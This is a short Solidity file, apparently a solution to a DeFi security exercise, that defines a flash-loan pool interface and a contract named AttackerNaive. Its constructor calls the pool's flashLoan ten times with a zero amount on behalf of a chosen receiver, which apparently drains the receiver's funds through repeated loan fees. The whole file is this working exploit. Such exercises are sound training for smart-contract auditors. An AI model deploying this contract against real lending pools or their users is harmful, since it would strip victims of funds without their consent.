// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface MyA {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract AttackerNaive {
    
    constructor(address receiver,address token, address _pool){
        for(uint256 i = 0; i < 10; i++)
            MyA(_pool).flashLoan(receiver,token,0,"0x");
    }
}